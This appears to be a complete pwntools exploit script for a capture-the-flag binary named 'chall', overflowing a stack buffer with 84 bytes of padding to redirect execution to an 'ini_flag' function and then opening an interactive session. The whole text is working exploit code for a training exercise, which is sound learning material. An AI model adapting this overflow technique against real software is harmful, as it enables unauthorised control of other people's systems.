from pwn import *
exe = context.binary = ELF("./chall")
r = process()
offset = 84
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(exe.sym['ini_flag'])
r.sendline(rop.chain())
r.interactive()